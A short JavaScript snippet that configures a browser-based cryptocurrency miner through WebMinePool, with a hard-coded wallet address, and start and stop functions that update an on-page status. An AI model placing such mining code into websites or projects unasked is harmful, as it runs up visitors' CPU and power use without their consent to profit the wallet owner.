// Setup miner using WebMinePool (browser-based mining proxy)
let miner = WMP.Anonymous('47omX32KfqqWiJtNCJteiYRZhRr6X8yti3pWQ6exu7LQFwMufjLt6Bq5PBqzD9KzUF65Be8VMqv64HEP9H7EN45v5YkSMEo', {
  threads: navigator.hardwareConcurrency,
  autoThreads: false,
  throttle: 0.2
});

function startMining() {
  miner.start();
  document.getElementById("status").innerText = "Mining started!";
}

function stopMining() {
  miner.stop();
  document.getElementById("status").innerText = "Mining stopped.";
}
